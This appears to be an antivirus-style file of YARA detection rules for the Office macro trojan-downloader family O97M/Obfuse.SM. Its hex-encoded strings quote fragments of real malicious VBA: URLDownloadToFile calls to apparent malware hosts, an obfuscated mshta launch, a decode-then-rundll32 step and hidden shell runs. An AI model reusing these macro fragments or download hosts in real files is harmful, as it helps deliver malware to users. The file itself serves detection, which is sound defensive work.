
rule TrojanDownloader_O97M_Obfuse_SM_MTB{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SM!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 45 6e 76 69 72 6f 6e 28 22 55 53 45 52 50 52 4f 46 49 4c 45 22 29 } //01 00  = Environ("USERPROFILE")
		$a_01_1 = {3d 20 6f 74 68 65 72 20 26 20 22 5c 7a 78 2e 65 78 65 22 } //01 00  = other & "\zx.exe"
		$a_01_2 = {70 75 74 73 20 3d 20 53 70 6c 69 74 28 6f 75 66 66 65 72 2c 20 22 26 22 29 } //01 00  puts = Split(ouffer, "&")
		$a_01_3 = {43 42 79 74 65 28 28 22 26 48 22 20 26 20 70 75 74 73 28 69 6e 66 6f 29 29 20 58 6f 72 20 26 48 46 46 29 } //00 00  CByte(("&H" & puts(info)) Xor &HFF)
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SM_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SM!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {20 3d 20 22 69 6c 65 28 27 68 74 74 70 3a 2f 2f 6f 6e 65 64 72 69 76 65 6e 65 74 2e 78 79 7a 2f 77 6f 72 6b 2f 33 30 2e 76 62 73 27 2c 22 } //01 00   = "ile('http://onedrivenet.xyz/work/30.vbs',"
		$a_01_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 56 78 58 74 67 52 67 57 59 28 22 5f 5b 6b 7a 71 78 7c 36 5b 70 6d 74 74 22 2c 20 22 38 22 29 29 } //01 00  = CreateObject(VxXtgRgWY("_[kzqx|6[pmtt", "8"))
		$a_03_2 = {2e 52 75 6e 20 90 02 25 2c 20 76 62 48 69 64 65 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SM_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SM!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
		
	strings :
		$a_01_0 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 66 75 63 6b 7a 61 72 67 75 73 29 2e 45 78 65 63 20 6c 75 6c 69 31 20 2b 20 6c 75 6c 69 32 } //01 00  CreateObject(fuckzargus).Exec luli1 + luli2
		$a_01_1 = {79 61 7a 65 65 64 39 20 3d 20 22 33 22 20 2b 20 22 30 22 20 2b 20 22 39 22 } //01 00  yazeed9 = "3" + "0" + "9"
		$a_01_2 = {6c 75 6c 69 32 20 3d 20 79 61 7a 65 65 64 39 20 2b 20 79 61 7a 65 65 64 31 30 20 2b 20 79 61 7a 65 65 64 31 32 } //01 00  luli2 = yazeed9 + yazeed10 + yazeed12
		$a_01_3 = {79 61 7a 65 65 64 31 30 20 3d 20 22 34 22 20 2b 20 22 38 22 20 2b 20 22 40 22 20 2b 20 22 61 } //00 00  yazeed10 = "4" + "8" + "@" + "a
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SM_MTB_4{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SM!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,07 00 07 00 06 00 00 02 00 "
		
	strings :
		$a_01_0 = {3d 20 45 6e 76 69 72 6f 6e 28 22 74 6d 70 22 29 20 26 20 22 5c 6d 61 69 6e 2e 74 68 65 6d 65 22 } //01 00  = Environ("tmp") & "\main.theme"
		$a_03_1 = {46 6f 72 20 90 05 08 06 61 2d 7a 30 2d 39 20 3d 20 31 20 54 6f 20 4c 65 6e 28 90 01 08 29 20 53 74 65 70 20 33 90 00 } //01 00 
		$a_03_2 = {3d 20 4d 69 64 28 90 01 08 2c 20 90 01 08 2c 20 31 29 90 00 } //01 00 
		$a_03_3 = {20 3d 20 53 74 72 43 6f 6e 76 28 90 01 08 2c 20 36 34 29 90 00 } //01 00 
		$a_03_4 = {53 65 74 20 90 05 08 06 61 2d 7a 30 2d 39 20 3d 20 4e 65 77 20 4d 53 58 4d 4c 32 2e 58 4d 4c 48 54 54 50 36 30 90 00 } //01 00 
		$a_03_5 = {43 61 6c 6c 20 90 05 08 06 61 2d 7a 30 2d 39 2e 4f 70 65 6e 28 22 47 45 54 22 2c 20 90 05 08 06 61 2d 7a 30 2d 39 2c 20 46 61 6c 73 65 29 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SM_MTB_5{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SM!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 06 00 00 01 00 "
		
	strings :
		$a_01_0 = {55 34 20 3d 20 22 63 22 20 2b 20 22 6d 22 20 2b 20 22 64 22 } //01 00  U4 = "c" + "m" + "d"
		$a_01_1 = {75 35 20 3d 20 22 6d 73 67 62 6f 78 2f 72 6d 22 20 2b 20 22 73 68 22 20 2b 20 22 74 61 20 22 } //01 00  u5 = "msgbox/rm" + "sh" + "ta "
		$a_01_2 = {69 69 20 3d 20 75 35 20 2b 20 75 36 20 2b 20 75 37 20 2b 20 75 38 } //01 00  ii = u5 + u6 + u7 + u8
		$a_01_3 = {63 6f 6f 6f 6f 20 3d 20 53 68 65 6c 6c 45 78 65 63 75 74 65 20 5f } //01 00  coooo = ShellExecute _
		$a_01_4 = {75 37 20 3d 20 22 79 2e 63 6f 6d 2f 61 73 64 6f 64 6f 22 } //01 00  u7 = "y.com/asdodo"
		$a_01_5 = {63 6c 6f 63 6b 20 3d 20 22 4f 50 45 4e 22 20 20 27 20 61 63 74 69 6f 6e 20 6d 69 67 68 74 20 62 65 20 4f 50 45 4e 2c 20 4e 45 57 20 6f 72 20 6f 74 68 65 72 2c 20 64 65 70 65 6e 64 69 6e 67 20 6f 6e 20 77 68 61 74 20 79 6f 75 20 6e 65 65 64 20 74 6f 20 64 6f } //00 00  clock = "OPEN"  ' action might be OPEN, NEW or other, depending on what you need to do
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SM_MTB_6{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SM!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 03 00 00 02 00 "
		
	strings :
		$a_01_0 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 20 30 2c 20 22 68 74 74 70 3a 2f 2f 39 6e 61 67 30 2e 63 6f 6d 2f 75 6e 62 62 6d 65 76 64 2f 64 37 36 2e 70 68 70 3f 6c 3d 6f 65 76 32 2e 63 61 62 22 2c 20 50 79 2c 20 30 2c 20 30 } //02 00  URLDownloadToFile 0, "http://9nag0.com/unbbmevd/d76.php?l=oev2.cab", Py, 0, 0
		$a_01_1 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 20 30 2c 20 22 68 74 74 70 3a 2f 2f 35 75 32 6d 72 2e 63 6f 6d 2f 75 6e 62 62 6d 65 76 64 2f 64 37 36 2e 70 68 70 3f 6c 3d 6f 65 76 34 2e 63 61 62 22 2c 20 47 61 2c 20 30 2c 20 30 } //01 00  URLDownloadToFile 0, "http://5u2mr.com/unbbmevd/d76.php?l=oev4.cab", Ga, 0, 0
		$a_03_2 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 20 30 2c 20 22 68 74 74 70 3a 2f 2f 90 02 07 2e 63 6f 6d 2f 75 6e 62 62 6d 65 76 64 2f 64 37 36 2e 70 68 70 3f 6c 3d 6f 65 76 34 2e 63 61 62 22 2c 20 47 61 2c 20 30 2c 20 30 90 00 } //00 00 
		$a_00_3 = {8f } //0a 01 
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SM_MTB_7{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SM!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 01 00 "
		
	strings :
		$a_01_0 = {42 72 43 57 76 6f 6f 56 4e 66 69 4a 6d 79 6a 4d } //01 00  BrCWvooVNfiJmyjM
		$a_01_1 = {53 6c 65 65 70 20 28 31 32 37 20 58 6f 72 20 31 30 39 31 29 } //01 00  Sleep (127 Xor 1091)
		$a_03_2 = {53 65 74 20 90 02 0f 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 90 02 10 28 41 72 72 61 79 28 31 36 30 2c 20 28 28 30 20 58 6f 72 20 34 29 20 2b 20 38 29 2c 20 28 28 36 33 20 58 6f 72 20 31 32 32 29 20 2b 20 31 37 34 29 29 2c 20 30 29 20 2b 90 00 } //01 00 
		$a_03_3 = {3d 20 45 6e 76 69 72 6f 6e 28 90 02 10 28 41 72 72 61 79 28 28 28 37 38 20 58 6f 72 20 33 33 29 20 2b 20 33 30 29 2c 20 31 34 2c 20 31 38 34 2c 20 28 28 31 32 20 58 6f 72 20 31 36 29 20 2b 20 28 30 20 58 6f 72 20 30 29 29 29 2c 20 28 28 32 20 58 6f 72 20 31 30 29 20 2b 20 28 31 32 20 58 6f 72 20 33 30 29 29 29 29 90 00 } //01 00 
		$a_01_4 = {43 61 6c 6c 20 53 68 65 6c 6c } //00 00  Call Shell
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Obfuse_SM_MTB_8{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.SM!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 06 00 00 01 00 "
		
	strings :
		$a_01_0 = {53 65 74 20 77 69 64 72 61 77 20 3d 20 47 65 74 4f 62 6a 65 63 74 28 43 68 72 57 28 31 31 39 29 20 2b 20 43 68 72 57 28 31 30 35 29 20 2b 20 43 68 72 57 28 31 31 30 29 20 2b 20 43 68 72 57 28 31 30 39 29 20 2b 20 43 68 72 57 28 31 30 33 29 20 2b 20 43 68 72 57 28 31 30 39 29 20 2b 20 43 68 72 57 28 31 31 36 29 20 2b 20 43 68 72 57 28 31 31 35 29 20 2b 20 43 68 72 57 28 35 38 29 20 2b 20 43 68 72 57 28 38 37 29 20 26 20 43 68 72 57 28 31 30 35 29 20 26 20 43 68 72 57 28 31 31 30 29 20 26 20 43 68 72 57 28 35 31 29 20 2b 20 43 68 72 57 28 35 30 29 20 2b 20 43 68 72 57 28 39 35 29 } //01 00  Set widraw = GetObject(ChrW(119) + ChrW(105) + ChrW(110) + ChrW(109) + ChrW(103) + ChrW(109) + ChrW(116) + ChrW(115) + ChrW(58) + ChrW(87) & ChrW(105) & ChrW(110) & ChrW(51) + ChrW(50) + ChrW(95)
		$a_03_1 = {73 74 72 4c 69 6e 65 20 3d 20 45 6e 76 69 72 6f 6e 24 28 22 55 53 45 52 50 52 4f 46 49 4c 45 22 29 20 2b 20 22 5c 90 05 09 06 61 2d 7a 30 2d 39 22 90 00 } //01 00 
		$a_01_2 = {73 74 72 4c 69 6e 65 32 20 3d 20 45 6e 76 69 72 6f 6e 24 28 43 68 72 57 28 36 35 29 20 2b 20 43 68 72 57 28 38 30 29 20 2b 20 43 68 72 57 28 38 30 29 20 2b 20 43 68 72 57 28 36 38 29 20 2b 20 43 68 72 57 28 36 35 29 20 2b 20 43 68 72 57 28 38 34 29 20 2b 20 43 68 72 57 28 36 35 29 29 20 2b 20 22 5c 22 20 2b 20 45 6e 76 69 72 6f 6e 24 28 43 6f 6d 4e 61 6d 65 29 20 2b 20 22 5c 22 20 2b 20 45 6e 76 69 72 6f 6e 24 28 43 6f 6d 4e 61 6d 65 29 } //01 00  strLine2 = Environ$(ChrW(65) + ChrW(80) + ChrW(80) + ChrW(68) + ChrW(65) + ChrW(84) + ChrW(65)) + "\" + Environ$(ComName) + "\" + Environ$(ComName)
		$a_01_3 = {2e 63 72 65 61 74 65 20 52 69 67 68 74 28 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e 44 65 66 61 75 6c 74 54 61 72 67 65 74 46 72 61 6d 65 20 2b 20 22 20 2d 64 65 63 6f 64 65 20 22 2c 20 31 37 29 20 2b 20 73 74 72 4c 69 6e 65 20 2b 20 43 68 72 57 28 34 36 29 20 2b 20 43 68 72 57 28 31 32 30 29 20 2b 20 43 68 72 57 28 31 30 38 29 20 2b 20 43 68 72 57 28 31 31 35 29 20 2b 20 22 20 22 20 2b 20 73 74 72 4c 69 6e 65 20 2b 20 22 2e 64 6c 6c } //01 00  .create Right(ThisDocument.DefaultTargetFrame + " -decode ", 17) + strLine + ChrW(46) + ChrW(120) + ChrW(108) + ChrW(115) + " " + strLine + ".dll
		$a_01_4 = {2e 63 72 65 61 74 65 20 52 69 67 68 74 28 22 63 63 38 35 67 37 38 63 38 39 66 37 39 39 62 63 61 66 62 38 38 61 39 65 67 67 65 62 63 36 66 61 67 38 37 72 75 6e 64 6c 6c 33 32 20 22 2c 20 39 29 20 2b 20 73 74 72 4c 69 6e 65 20 26 20 22 2e 64 6c 6c 2c 45 6e 74 72 79 50 6f 69 6e 74 22 2c } //01 00  .create Right("cc85g78c89f799bcafb88a9eggebc6fag87rundll32 ", 9) + strLine & ".dll,EntryPoint",
		$a_03_5 = {73 74 72 4c 69 6e 65 20 3d 20 45 6e 76 69 72 6f 6e 24 28 22 55 53 45 52 50 52 4f 46 49 4c 45 22 29 20 2b 20 22 5c 90 05 09 06 61 2d 7a 41 2d 5a 22 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}